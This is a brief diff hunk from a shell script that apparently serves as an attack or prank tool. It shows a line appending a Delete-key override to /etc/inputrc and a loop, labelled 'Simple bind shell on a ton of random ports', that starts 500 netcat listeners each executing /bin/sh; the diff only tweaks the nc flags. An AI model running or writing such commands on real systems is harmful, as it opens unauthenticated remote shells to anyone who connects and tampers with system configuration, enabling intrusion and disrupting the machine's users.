@@ -26,5 +26,5 @@ echo '"\e[3~": "nope"' >> /etc/inputrc
 #Simple bind shell on a ton of random ports
 for i in {1..500}
 do
-   nc -lk -e /bin/sh &
+   nc -lke /bin/sh &
 done
